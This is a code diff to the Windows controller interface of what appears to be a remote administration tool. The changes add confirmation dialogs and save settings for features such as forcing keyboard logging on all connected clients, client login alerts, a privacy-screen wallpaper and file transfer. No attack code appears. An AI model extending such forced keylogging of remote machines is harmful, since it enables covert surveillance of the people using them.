@@ -921,11 +921,11 @@ VOID CMy2015RemoteDlg::CreateSolidMenu()
     m_MainMenu.SetMenuItemBitmaps(ID_TOOL_AUTH, MF_BYCOMMAND, &m_bmOnline[33], &m_bmOnline[33]);
     m_MainMenu.SetMenuItemBitmaps(ID_TOOL_GEN_MASTER, MF_BYCOMMAND, &m_bmOnline[34], &m_bmOnline[34]);
     m_MainMenu.SetMenuItemBitmaps(ID_TOOL_LICENSE_MGR, MF_BYCOMMAND, &m_bmOnline[35], &m_bmOnline[35]);
-    m_MainMenu.SetMenuItemBitmaps(ID_TOOL_V2_PRIVATEKEY, MF_BYCOMMAND, &m_bmOnline[30], &m_bmOnline[30]);
+    m_MainMenu.SetMenuItemBitmaps(ID_TOOL_V2_PRIVATEKEY, MF_BYCOMMAND, /*&m_bmOnline[30]*/0, /*&m_bmOnline[30]*/0);
     // Parameters menu
-    m_MainMenu.SetMenuItemBitmaps(ID_PARAM_KBLOGGER, MF_BYCOMMAND, &m_bmOnline[36], &m_bmOnline[36]);
-    m_MainMenu.SetMenuItemBitmaps(ID_PARAM_LOGIN_NOTIFY, MF_BYCOMMAND, &m_bmOnline[37], &m_bmOnline[37]);
-    m_MainMenu.SetMenuItemBitmaps(ID_PARAM_ENABLE_LOG, MF_BYCOMMAND, &m_bmOnline[38], &m_bmOnline[38]);
+    m_MainMenu.SetMenuItemBitmaps(ID_PARAM_KBLOGGER, MF_BYCOMMAND, /*&m_bmOnline[36]*/0, /*&m_bmOnline[36]*/0);
+    m_MainMenu.SetMenuItemBitmaps(ID_PARAM_LOGIN_NOTIFY, MF_BYCOMMAND, /*&m_bmOnline[37]*/0, /*&m_bmOnline[37]*/0);
+    m_MainMenu.SetMenuItemBitmaps(ID_PARAM_ENABLE_LOG, MF_BYCOMMAND, /*&m_bmOnline[38]*/0, /*&m_bmOnline[38]*/0);
     // Extensions menu
     m_MainMenu.SetMenuItemBitmaps(ID_HISTORY_CLIENTS, MF_BYCOMMAND, &m_bmOnline[39], &m_bmOnline[39]);
     m_MainMenu.SetMenuItemBitmaps(ID_BACKUP_DATA, MF_BYCOMMAND, &m_bmOnline[40], &m_bmOnline[40]);
@@ -1935,6 +1935,10 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 
         m_bHookWIN = THIS_CFG.GetInt("settings", "HookWIN", 0);
         SubMenu->CheckMenuItem(ID_HOOK_WIN, m_bHookWIN ? MF_CHECKED : MF_UNCHECKED);
+
+        std::string wallpaper = THIS_CFG.GetStr("settings", "Wallpaper", "");
+        m_PrivateScreenWallpaper = wallpaper.c_str();
+        SubMenu->CheckMenuItem(ID_PARAM_PRIVACY_WALLPAPER, !m_PrivateScreenWallpaper.IsEmpty() ? MF_CHECKED : MF_UNCHECKED);
     }
     // 查找IP定位子菜单并设置勾选状态
     SubMenu = FindSubMenuByCommand(m_MainMenu.GetSubMenu(3), ID_LOCATION_QQWRY);
@@ -8387,6 +8391,8 @@ void CMy2015RemoteDlg::OnParamKblogger()
         SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "KeyboardLog", m_settings.EnableKBLogger);
     SendMasterSettings(nullptr, m_settings);
+    MessageBoxA(m_settings.EnableKBLogger ? _TR("所有客户端的键盘记录被强制启用。") : _TR("客户端的键盘记录需要单独打开。"), 
+        _TR("提示"), MB_ICONINFORMATION);
 }
 
 
@@ -8416,6 +8422,7 @@ void CMy2015RemoteDlg::OnParamLoginNotify()
     CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
     if (SubMenu)
         SubMenu->CheckMenuItem(ID_PARAM_LOGIN_NOTIFY, m_needNotify ? MF_CHECKED : MF_UNCHECKED);
+    MessageBoxA(m_needNotify ? _TR("已启用客户端上线通知。") : _TR("已关闭客户端上线通知。"), _TR("提示"), MB_ICONINFORMATION);
 }
 
 
@@ -8427,6 +8434,7 @@ void CMy2015RemoteDlg::OnParamEnableLog()
         SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "EnableLog", m_settings.EnableLog);
     SendMasterSettings(nullptr, m_settings);
+    MessageBoxA(m_settings.EnableLog ? _TR("已启用客户端日志。") : _TR("已关闭客户端日志。"), _TR("提示"), MB_ICONINFORMATION);
 }
 
 void CMy2015RemoteDlg::OnParamPrivacyWallpaper()
@@ -8457,9 +8465,14 @@ void CMy2015RemoteDlg::OnParamPrivacyWallpaper()
         file.Close();
 
         m_PrivateScreenWallpaper = path;
+        THIS_CFG.SetStr("settings", "Wallpaper", path.GetString());
+        auto SubMenu = m_MainMenu.GetSubMenu(2);  // 工具菜单
+        if (SubMenu) {
+            SubMenu->CheckMenuItem(ID_PARAM_PRIVACY_WALLPAPER, MF_CHECKED);
+        }
         CString msg;
         msg.Format(_TR("隐私屏幕壁纸已设置为:\n%s"), path);
-        MessageBox(msg, _TR("设置成功"), MB_ICONINFORMATION);
+        MessageBox(msg + CString("\n") + _L("如需恢复默认值，请从磁盘移除该文件。"), _TR("设置成功"), MB_ICONINFORMATION);
     }
 }
 
@@ -8471,6 +8484,8 @@ void CMy2015RemoteDlg::OnParamFileV2()
         SubMenu->CheckMenuItem(ID_PARAM_FILE_V2, m_bEnableFileV2 ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "EnableFileV2", m_bEnableFileV2 ? 1 : 0);
     Mprintf("文件传输V2: %s\n", m_bEnableFileV2 ? "启用" : "禁用");
+    MessageBoxA(m_bEnableFileV2 ? _TR("已启用文件传输协议V2，支持断点续传和C2C传输。") : _TR("已关闭文件传输协议V2。"), 
+        _TR("提示"), MB_ICONINFORMATION);
 }
 
 void CMy2015RemoteDlg::OnParamRunAsUser()
